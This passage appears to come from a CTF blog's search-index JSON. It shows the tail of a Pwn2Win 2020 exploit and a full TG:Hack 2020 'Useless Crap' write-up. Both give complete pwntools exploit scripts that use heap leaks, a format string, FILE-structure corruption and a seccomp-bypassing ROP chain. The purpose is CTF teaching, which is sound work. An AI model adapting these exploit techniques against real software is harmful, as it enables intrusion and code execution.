include(123,\u0026quot;A\u0026quot;*5) include(0,\u0026quot;A\u0026quot;*280+fake1) #1st part include(0,fake2) #2nd part  The final exploit is here \\o/ !\nfrom pwn import * from pwn import log as Log from time import sleep def log(title,value): Log.info(title + \u0026quot;: {} \u0026quot;.format(hex(value))) period = 0.2 def include(priority,command): p.sendline(\u0026quot;1\u0026quot;) p.recv(8000) p.sendline(str(priority)) p.recv(8000) p.send(command) sleep(period) p.recv(8000) def review(index): p.sendline(\u0026quot;2\u0026quot;) p.recv(8000) p.sendline(str(index)) p.recvuntil(\u0026quot;Command: \u0026quot;) data = p.recvline().strip() p.recv(8000) return data def delete(index): p.sendline(\u0026quot;3\u0026quot;) p.recv(8000) p.sendline(str(index)) p.recv(8000) def init(name): p.sendline(name) p.recv(8000) for _ in range(100): #p = process(\u0026quot;./command\u0026quot;) p=remote(\u0026quot;command.pwn2.win\u0026quot;,1337) p.recv(8000) payload = \u0026quot;\u0026quot; payload += \u0026quot;%4$hn\u0026quot; init(payload) for i in range(9): include(123,\u0026quot;abc\u0026quot;) for i in range(8): delete(i) for i in range(7): include(123,chr(65+i)*3) include(123,\u0026quot;a\u0026quot;) data = review(7) leak = u64(data.ljust(8,\u0026quot;\\x00\u0026quot;)) leak = leak \u0026amp; 0xffffffffffffff00 leak = leak | 0xa0 log(\u0026quot;leak\u0026quot;,leak) base = leak - 0x3ebca0 str_overflow = base + 0x3e8378 one_gadget = base + 0x4f322 _IO_lock=base+0x3ed8b0 log(\u0026quot;base\u0026quot;,base) log(\u0026quot;str_overflow\u0026quot;,str_overflow) log(\u0026quot;one_gadget\u0026quot;,one_gadget) include(123,\u0026quot;KKKKKKKKKKKKK\u0026quot;) fake1=\u0026quot;\u0026quot; fake1+=p64(0xfbad2400) fake1+=p64(0)*8 fake1+=p64(0)*2 fake2=p64(_IO_lock)*3 fake2+=p64(0xffffffffffffffff) fake2+=p64(0) fake2+=p64(0) fake2+=p64(0)*6 fake2+=p64(str_overflow-136) fake2+=p64(one_gadget) for i in range(10): delete(i) for i in range(8): include(123,\u0026quot;A\u0026quot;*5) include(0,\u0026quot;A\u0026quot;*280+fake1) include(0,fake2) p.sendline(\u0026quot;5\u0026quot;) p.sendline(\u0026quot;1\u0026quot;) try: p.sendline(\u0026quot;id\u0026quot;) p.interactive() except: c=0 p.close()  And here we go :D\n","date":1590938407,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1590938407,"objectID":"323cda163100694cb2163b36f331e3a7","permalink":"/post/pwn2win-2020-at_your_command/","publishdate":"2020-05-31T16:20:07+01:00","relpermalink":"/post/pwn2win-2020-at_your_command/","section":"post","summary":"Challenge Details    Event Challenge Category Link     Pwn2Win At_Your_Command PWN https://ctftime.org/event/961    Description  Through reverse engineering work on Pixel 6, we identified the ButcherCorp server responsible for programming the RBSes.","tags":[],"title":"Pwn2Win 2020   At_Your_Command","type":"post"},{"authors":[],"categories":[],"content":"​\nChallenge Details    Event Challenge Category Link     TG:Hack CTF 2020 Useless Crap PWN https://ctftime.org/event/932    ​\nDescription  Here\u0026rsquo;s some useless crap for you. The flag is at /home/crap/flag.txt.\nnc crap.tghack.no 6001  or use a mirror closer to you:\n nc us.crap.tghack.no 6001 (US) nc asia.crap.tghack.no 6001 (Japan)  files:\n  crap  libc-2.31.so  ld-2.31.so   TL;DL   Leak Libc address through unsorted bin chunks UAF\n  Get infinte arbitary read/write/heap allocations\n  Write open/read/write ROP chain after srip of main function using allowed syscalls\n  Stack pivot to our ROP chain and read flag.txt\nTGHack 2020 had some challenging PWN tasks, and Useless Crap was one of the hardest that we were able to solve during the CTF with our teammate Aracna.\n  As Detailed in the description of the challenge, the author provided the necessary files to run the binary as intended, our first thought was how to patch the binary to use the provided libc and ld files instead of our system libraries. Because this will make it easier for us when developing our exploit in a way that offsets are the same locally and remotely.\nTo make this happen we always patch the binary using the method described at Using Non-system Glibc\n$ mv crap old_crap $ python patch_binary.py crap libc.so.6 ld-2.31.so new_crap Current ld.so: Path: /usr/local/lib/ld-linux-x86-64.so.2 New ld.so: Path: /home/anisboss/pwn/tg/pwn/crap/patch/ld-2.31.so Adding RUNPATH: Path: /home/anisboss/pwn/tg/pwn/crap/patch Writing new binary new_crap Please rename /home/anisboss/pwn/tg/pwn/crap/patch/libc.so.6 to /home/anisboss/pwn/tg/pwn/crap/patch/libc.so.6. $ ldd new_crap linux-vdso.so.1 (0x00007ffd93345000) libseccomp.so.2 =\u0026gt; /usr/lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f8b6de51000) libc.so.6 =\u0026gt; /home/anisboss/pwn/tg/pwn/crap/patch/libc.so.6 (0x00007f8b6da96000) /home/anisboss/pwn/tg/pwn/crap/patch/ld-2.31.so =\u0026gt; /lib64/ld-linux-x86-64.so.2 (0x00007f8b6eed4000)  As u can see the new binary is linked to the provided libraries instead of the standard system libc/ld. In this way we can start running the binary and developing our exploit in the same environment as the remote server.\nReverse Engineering Opening up the binary in IDA, reveals a seccomp filters before starting the main function, which is a filter to block certain syscalls, based on the syscall number .\nscmp_filter_ctx v0 = seccomp_init(0); v2 = v0; if ( !v0 ) { puts(\u0026quot;seccomp_init() error\u0026quot;); exit(1); } seccomp_rule_add(v0, 2147418112LL, 0LL, 1LL); // read syscall seccomp_rule_add(v2, 2147418112LL, 231LL, 0LL); // exit_group syscall seccomp_rule_add(v2, 2147418112LL, 1LL, 1LL); // write syscall seccomp_rule_add(v2, 2147418112LL, 10LL, 0LL); // mprotect syscall seccomp_rule_add(v2, 2147418112LL, 2LL, 0LL); // open syscall seccomp_rule_add(v2, 2147418112LL, 3LL, 0LL); // close syscall if ( seccomp_load(v2) \u0026lt; 0 ) { seccomp_release(v2); puts(\u0026quot;seccomp_load() error\u0026quot;); exit(1); } return seccomp_release(v2); }  Using seccomp-tools, we can get the following table\n$ seccomp-tools dump ./new_crap line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x12 0xc000003e if (A != ARCH_X86_64) goto 0020 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0f 0xffffffff if (A != 0xffffffff) goto 0020 0005: 0x15 0x0d 0x00 0x00000002 if (A == open) goto 0019 0006: 0x15 0x0c 0x00 0x00000003 if (A == close) goto 0019 0007: 0x15 0x0b 0x00 0x0000000a if (A == mprotect) goto 0019 0008: 0x15 0x0a 0x00 0x000000e7 if (A == exit_group) goto 0019 0009: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0014 0010: 0x20 0x00 0x00 0x00000014 A = args[0] \u0026gt;\u0026gt; 32 0011: 0x15 0x00 0x08 0x00000000 if (A != 0x0) goto 0020 0012: 0x20 0x00 0x00 0x00000010 A = args[0] 0013: 0x15 0x05 0x06 0x00000000 if (A == 0x0) goto 0019 else goto 0020 0014: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0020 0015: 0x20 0x00 0x00 0x00000014 A = args[0] \u0026gt;\u0026gt; 32 0016: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0020 0017: 0x20 0x00 0x00 0x00000010 A = args[0] 0018: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0020: 0x06 0x00 0x00 0x00000000 return KILL  We can see that execve and execveat are blocked, which means no shell for us, fork/vfork/clone are blocked, so we can\u0026rsquo;t create new processes that are free of these seccomp restrictions. Our approach is to use ORW (open read write) capabilities but we should keep in mind that at lines 11-13 the program checks the first argument passed to read syscall and verify if it\u0026rsquo;s equal to 0 or not. If it\u0026rsquo;s the case then we will be allowed else the syscall will be blocked which means that we can only read from stdin with same analogy we can write only to stdout.\nNow moving to the main function, the program defines two major functions do_read() and do_write() which are made for arbitrary 8 bytes read/write . this functions can be called only twice but this will be bypassed later.\n// read from arbitrary address __int64 do_read() { __int64 *v1; // [sp+8h] [bp-18h]@3 __int64 v2; // [sp+10h] [bp-10h]@3 __int64 v3; // [sp+18h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); if ( read_count \u0026lt;= 1 ) { printf(\u0026quot;addr: \u0026quot;); __isoc99_scanf(\u0026quot;%lx\u0026quot;, \u0026amp;v1); empty_newline(); v2 = *v1; printf(\u0026quot;value: %p\\n\u0026quot;, v2); ++read_count; } else { puts(\u0026quot;No more reads for you!\u0026quot;); } return *MK_FP(__FS__, 40LL) ^ v3; } // write 8 bytes to arbitrary address __int64 do_write() { _QWORD *v1; // [sp+8h] [bp-18h]@3 __int64 v2; // [sp+10h] [bp-10h]@3 __int64 v3; // [sp+18h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); if ( write_count \u0026lt;= 1 ) { printf(\u0026quot;addr/value: \u0026quot;); __isoc99_scanf(\u0026quot;%lx %lx\u0026quot;, \u0026amp;v1); empty_newline(\u0026quot;%lx %lx\u0026quot;, \u0026amp;v1); *v1 = v2; ++write_count; } else { puts(\u0026quot;No more writes for you!\u0026quot;); } return *MK_FP(__FS__, 40LL) ^ v3; }  beyond that, there were another two functions leave_feedback and view_feedback which basically let you write into long heap chunks using calloc function and view that content.\n//create large chunk void leave_feedback() { char *v0; // rsi@5 char v1; // [sp+Fh] [bp-1h]@5 if ( feedback ) { puts(\u0026quot;that's enough feedback for one day...\u0026quot;); } else { feedback = (char *)calloc(1uLL, 0x501uLL); printf(\u0026quot;feedback: \u0026quot;, 1281LL); if ( !fgets(feedback, 1280, stdin) ) exit(1); v0 = feedback; printf(\u0026quot;you entered: %s\\n\u0026quot;, feedback); puts(\u0026quot;Do you want to keep your feedback? (y/n)\u0026quot;); v1 = getchar(); empty_newline(\u0026quot;Do you want to keep your feedback? (y/n)\u0026quot;, v0); if ( v1 != 121 \u0026amp;\u0026amp; v1 == 110 ) free(feedback); } } // view created chunk content int view_feedback() { int result; // eax@2 if ( feedback ) result = printf(\u0026quot;feedback: %s\\n\u0026quot;, feedback); else result = puts(\u0026quot;Leave feedback first!\u0026quot;); return result; }  Exploitation Since the binary has PIE enabled we couldn\u0026rsquo;t use the read/write functions until we get a leak. which is somehow trivial in our case using the following process:\n  Allocate a chunk using leave_feedback function and free it and since the seccomp filters uses heap to allocate its rules the freed chunk will never be merged with top chunk and considering the big size of allocation is 0x501 the freed chunk will go to unsorted bin because tcache bins can only holds size lower then 0x408.\n  The freed chunk\u0026rsquo;s data (FD and BK pointers) now holds a libc address that we will use in view_feedback to print its content because the author doesn\u0026rsquo;t check if the chunk if freed or not before passing it to puts function thus trigger a UAF that leads to leaking libc address.\n  We start by implementing the functions needed to communicate with the binary.\nfrom pwn import * def leave_feedback(s,feedback,free=True): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;3\u0026quot;) s.sendline(feedback) if free: s.sendline(\u0026quot;n\u0026quot;) else: s.sendline(\u0026quot;y\u0026quot;) def view_feedback(s): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;4\u0026quot;) s.recvuntil(\u0026quot;feedback: \u0026quot;) data = s.recvuntil(\u0026quot;\\n\u0026quot;).strip() return data p = process(\u0026quot;./new_crap\u0026quot;) leave_feedback(p,\u0026quot;abc\u0026quot;) libc_addr = view_feedback(p) leaked_fd = u64(libc_addr.ljust(8,\u0026quot;\\x00\u0026quot;)) print \u0026quot;leaked address :\u0026quot;,hex(leaked_fd)  Running the above snippet give us the libc address\n$ python sploit.py [+] Starting local process './new_crap': pid 28823 leaked address : 0x7f24bb47abe0 [*] Stopped process './new_crap' (pid 28823)  Now we got the libc address, we need to calculate the libc base and the different useful offsets that we will need later. We can do this by setting a breakpoint or attaching the process while being in interactive mode. We prefer the second method.\ngdb-peda$ vmmap Start End Perm\tName 0x0000563fdba91000 0x0000563fdba96000 r-xp\t/home/anisboss/pwn/tg/pwn/crap/final/final 0x0000563fdbc95000 0x0000563fdbc96000 r--p\t/home/anisboss/pwn/tg/pwn/crap/final/final 0x0000563fdbc96000 0x0000563fdbc97000 rw-p\t/home/anisboss/pwn/tg/pwn/crap/final/final 0x0000563fdbe97000 0x0000563fdbe98000 rw-p\t/home/anisboss/pwn/tg/pwn/crap/final/final 0x0000563fdc298000 0x0000563fdc299000 r--p\t/home/anisboss/pwn/tg/pwn/crap/final/final 0x0000563fdca99000 0x0000563fdca9a000 r--p\t/home/anisboss/pwn/tg/pwn/crap/final/final 0x0000563fdd802000 0x0000563fdd823000 rw-p\t[heap] 0x00007fb2d5139000 0x00007fb2d52eb000 r-xp\t/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6 0x00007fb2d52eb000 0x00007fb2d54ea000 ---p\t/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6 0x00007fb2d54ea000 0x00007fb2d54ee000 r--p\t/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6 0x00007fb2d54ee000 0x00007fb2d54f0000 rw-p\t/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6 0x00007fb2d54f0000 0x00007fb2d54f4000 rw-p\tmapped [...] 0x00007fb2d54f4000 0x00007fb2d551c000 r-xp\t/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so 0x00007fb2d571b000 0x00007fb2d571c000 r--p\t/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so 0x00007fb2d571c000 0x00007fb2d571d000 rw-p\t/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so 0x00007fb2d571d000 0x00007fb2d571e000 rw-p\tmapped 0x00007fff7ab85000 0x00007fff7aba6000 rw-p\t[stack] 0x00007fff7abd1000 0x00007fff7abd4000 r--p\t[vvar] 0x00007fff7abd4000 0x00007fff7abd6000 r-xp\t[vdso] gdb-peda$ p 0x7fb2d54eebe0 - 0x00007fb2d5139000 $1 = 0x3b5be0 //offset from libc base  The next step is to get infinite read/write primitive in order to read and write data to bypass the restriction made in the binary. To do this we need to get the address of variables write_count and read_count located in .bss.\nIn order to leak a stack address from libc, There is a symbol environ in libc, whose value is the same as the third argument of main function, char **envp. The value of char **envp is on the stack, thus we can leak stack address with this symbol.\n$ readelf -s ./libc.so.6 |grep -i environ 299: 00000000003b8618 8 OBJECT WEAK DEFAULT 32 _environ@@GLIBC_2.2.5 1021: 00000000003b8618 8 OBJECT WEAK DEFAULT 32 environ@@GLIBC_2.2.5 1373: 00000000003b8618 8 OBJECT GLOBAL DEFAULT 32 __environ@@GLIBC_2.2.5 405: 00000000003b6c78 8 OBJECT LOCAL DEFAULT 32 last_environ 1817: 0000000000000000 0 FILE LOCAL DEFAULT ABS environ.c 4800: 0000000000037d10 953 FUNC LOCAL DEFAULT 13 __add_to_environ 6190: 00000000003b8618 8 OBJECT WEAK DEFAULT 32 _environ 6916: 00000000003b8618 8 OBJECT GLOBAL DEFAULT 32 __environ 7031: 00000000003b8618 8 OBJECT WEAK DEFAULT 32 environ  Since at first we have only two shots for both read and write functions let\u0026rsquo;s use the read at first to read the stack address then we will look into the stack for an address pointing to our binary when found we calculate the distance between that address and binary base then we conclude the address of write_count/read_count. Now we got what we need, let\u0026rsquo;s develop the write/read functions in our exploit and get the needed values.\nfrom pwn import * def read(s,addr): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;1\u0026quot;) s.sendlineafter(\u0026quot;addr: \u0026quot;,addr) p.recvuntil(\u0026quot;value: \u0026quot;) leaked = p.recvline() return leaked.strip() def write(s,addr,value): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;2\u0026quot;) s.sendline(hex(addr)+ \u0026quot; \u0026quot; + hex(value)) def leave_feedback(s,feedback,free=True): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;3\u0026quot;) s.sendline(feedback) if free: s.sendline(\u0026quot;n\u0026quot;) else: s.sendline(\u0026quot;y\u0026quot;) def view_feedback(s): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;4\u0026quot;) s.recvuntil(\u0026quot;feedback: \u0026quot;) data = s.recvuntil(\u0026quot;\\n\u0026quot;).strip() return data p = process(\u0026quot;./new_crap\u0026quot;) leave_feedback(p,\u0026quot;abc\u0026quot;) libc_addr = view_feedback(p) leaked_fd = u64(libc_addr.ljust(8,\u0026quot;\\x00\u0026quot;)) print \u0026quot;leaked address :\u0026quot;,hex(leaked_fd) base = leaked_fd - 3890144 print \u0026quot;libc_base : \u0026quot;,hex(base) environ = base + 0x00000000003b8618 print \u0026quot;environ_libc : \u0026quot;,hex(environ) leaked_stack = int(read(p,hex(environ)),16) print \u0026quot;leaked_stack : \u0026quot;,hex(leaked_stack) to_leak = leaked_stack -264 leaked_bin = int(read(p,hex(to_leak)),16) bin_base = leaked_bin - 4640 print \u0026quot;binary base : \u0026quot;,hex(bin_base) bss = bin_base + 0x0000000000205010 write_count = bin_base+0x0000000000202034 feedback = write_count+0x4 read_count = write_count - 0x4 print \u0026quot;feedback: \u0026quot;,hex(feedback) print \u0026quot;write_count: \u0026quot;,hex(write_count) print \u0026quot;read_count: \u0026quot;,hex(read_count) #gdb.attach(p) p.interactive()  $ python sploit.py [+] Starting local process './new_crap': pid 29333 leaked address : 0x7fba2c791be0 libc_base : 0x7fba2c3dc000 environ_libc : 0x7fba2c794618 leaked_stack : 0x7fff22ca9f88 binary base : 0x555a6cb69000 feedback: 0x555a6cd6b038 write_count: 0x555a6cd6b034 read_count: 0x555a6cd6b030 [*] Switching to interactive mode \u0026gt; $  Now we have the addresses of write_count and read_count variables, and since the binary is making a signed comparison , we can put negative values in our case we will choose -200 which is in hex 0xffffff38.\nwrite(p,read_count,0) write(p,write_count,4294967096)  Our methodology is to build a ROP chain, at first we tried to overwrite manually the return pointer of do_write() function with leave ; ret  gadget after performing those instructions the program returned to saved return pointer of the main function so if we overwrite srip of main with our gadgets we can successfully pivot to our ROP chain.\nTo do so, following the seccomp rules defined in the binary we should construct an open/read/write rop chain. And since we are allowed only to read from stdin therefore the File Descriptor returned by open syscall must be 0.\n as we know that FDs 0,1,2 are reserverd by stdin,stdout and stderr respectively. Open operation will return the first free FD (starting from 0) ; so if we perform a close(0) call before opening the flag file ; the next open syscall will find the FD 0 is free and will assign it to the opened file.\n To Build such ropchain, we need to find gadgets to control the different registers rax,rdi,rsi,rdx we can get these useful gadgets from libc using the ropper tool.\n$ ropper --file ./libc.so.6 --search 'pop r?x; ret;|pop r?i; ret;' [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: pop r?x; ret;|pop r?i; ret; [INFO] File: ./libc.so.6 0x0000000000038e88: pop rax; ret; 0x000000000002bc45: pop rbx; ret; 0x0000000000021882: pop rdi; ret; 0x0000000000001b9a: pop rdx; ret; 0x0000000000022192: pop rsi; ret;  We need to store the flag path somewhere, we chose heap since we have a function that allocates a chunk with controlled data for us. Before that we need to overwrite feedback variable with 0 in order to be able to use leave_feedback again. The Foward Pointer leaked in the first step contains a heap pointer we will use the do_read() to leak its content thus we can calculate the flag path address which is the address of the new allocated chunk.\nleaked_heap=int(read(p,hex(leaked_fd)),16) print \u0026quot;leaked_heap :\u0026quot;,hex(leaked_heap) flag_file=leaked_heap-0x1260 print \u0026quot;flag_file :\u0026quot;,hex(flag_file) write(p,feedback,0) leave_feedback(p,\u0026quot;/home/crap/flag.txt\\x00\u0026quot;,False) #flag path will be at flag_file address  Our next step is to construct the final ROP chain using obtained gadgets.\npop_rax = base+0x0000000000038e88 syscall_ret = base+0x0000000000039049 pop_rdi = base + 0x0000000000021882 pop_rsi = base + 0x0000000000022192 pop_rdx = base + 0x0000000000001b9a leave_ret = base + 0x0000000000040222 rop_chain=[ pop_rdi, 0, pop_rax, 3, syscall_ret, #close(0) pop_rdi, flag_file, pop_rsi, 0, pop_rax, 0x2, pop_rdx, 0, syscall_ret, #open(flag_file,0,0) \u0026lt;== this will return 0 as File Descriptor pop_rdi, 0, pop_rsi, flag_file, pop_rdx, 0x100, pop_rax, 0x0, syscall_ret,#read(0,flag_file,0x100) pop_rdi, 1, pop_rsi, flag_file, pop_rdx, 0x100, pop_rax, 0x1, syscall_ret #write(1,flag_file,0x100) ]  Now we just need to calculate the srip of main and do_write functions and place our ROP chain in the stack.\nThe final exploit:\nfrom pwn import * def read(s,addr): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;1\u0026quot;) s.sendlineafter(\u0026quot;addr: \u0026quot;,addr) p.recvuntil(\u0026quot;value: \u0026quot;) leaked = p.recvline() return leaked.strip() def write(s,addr,value): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;2\u0026quot;) s.sendline(hex(addr)+ \u0026quot; \u0026quot; + hex(value)) def leave_feedback(s,feedback,free=True): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;3\u0026quot;) s.sendline(feedback) if free: s.sendline(\u0026quot;n\u0026quot;) else: s.sendline(\u0026quot;y\u0026quot;) def view_feedback(s): s.sendlineafter(\u0026quot;\u0026gt; \u0026quot;,\u0026quot;4\u0026quot;) s.recvuntil(\u0026quot;feedback: \u0026quot;) data = s.recvuntil(\u0026quot;\\n\u0026quot;).strip() return data p = process(\u0026quot;./new_crap\u0026quot;) leave_feedback(p,\u0026quot;abc\u0026quot;) libc_addr = view_feedback(p) leaked_fd = u64(libc_addr.ljust(8,\u0026quot;\\x00\u0026quot;)) print \u0026quot;leaked address :\u0026quot;,hex(leaked_fd) base = leaked_fd - 3890144 print \u0026quot;libc_base : \u0026quot;,hex(base) environ = base + 0x00000000003b8618 print \u0026quot;environ_libc : \u0026quot;,hex(environ) leaked_stack = int(read(p,hex(environ)),16) print \u0026quot;leaked_stack : \u0026quot;,hex(leaked_stack) to_leak = leaked_stack -264 leaked_bin = int(read(p,hex(to_leak)),16) bin_base = leaked_bin - 4640 print \u0026quot;binary base : \u0026quot;,hex(bin_base) bss = bin_base + 0x0000000000205010 write_count = bin_base+0x0000000000202034 feedback = write_count+0x4 read_count = write_count - 0x4 print \u0026quot;feedback: \u0026quot;,hex(feedback) print \u0026quot;write_count: \u0026quot;,hex(write_count) print \u0026quot;read_count: \u0026quot;,hex(read_count) write(p,read_count,0) write(p,write_count,4294967096) leaked_heap=int(read(p,hex(leaked_fd)),16) print \u0026quot;leaked_heap :\u0026quot;,hex(leaked_heap) flag_file=leaked_heap-0x1260 print \u0026quot;flag_file :\u0026quot;,hex(flag_file) write(p,feedback,0) leave_feedback(p,\u0026quot;/home/crap/flag.txt\\x00\u0026quot;,False) #flag path will be at flag_file address eip_main=leaked_stack-256 eip_do_write=eip_main-32 print \u0026quot;seip_main: \u0026quot;,hex(eip_main) print \u0026quot;seip_do_write: \u0026quot;,hex(eip_do_write) pop_rax = base+0x0000000000038e88 syscall_ret = base+0x0000000000039049 pop_rdi = base + 0x0000000000021882 pop_rsi = base + 0x0000000000022192 pop_rdx = base + 0x0000000000001b9a leave_ret = base + 0x0000000000040222 rop_chain=[ pop_rdi, 0, pop_rax, 3, syscall_ret, #close(0) pop_rdi, flag_file, pop_rsi, 0, pop_rax, 0x2, pop_rdx, 0, syscall_ret, #open(flag_file,0,0) \u0026lt;== this will return 0 as File Descriptor pop_rdi, 0, pop_rsi, flag_file, pop_rdx, 0x100, pop_rax, 0x0, syscall_ret,#read(0,flag_file,0x100) pop_rdi, 1, pop_rsi, flag_file, pop_rdx, 0x100, pop_rax, 0x1, syscall_ret #write(1,flag_file,0x100) ] #write our rop chain in the stack for i in range(len(rop_chain)): write(p,eip_main+(i*8),rop_chain[i]) #pause() write(p,eip_do_write,leave_ret) p.interactive()  And Here we go \\o/ ! ","date":1586887064,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1586887064,"objectID":"67ebf57ff6ecc1d1d972e7fd2ff5eeda","permalink":"/post/tghack-2020-useless-crap/","publishdate":"2020-04-14T18:57:44+01:00","relpermalink":"/post/tghack-2020-useless-crap/","section":"post","summary":"​\nChallenge Details    Event Challenge Category Link     TG:Hack CTF 2020 Useless Crap PWN https://ctftime.org/event/932    ​\nDescription  Here\u0026rsquo;s some useless crap for you.","tags":[],"title":"TG:HACK 2020   Useless Crap","type":"post"}]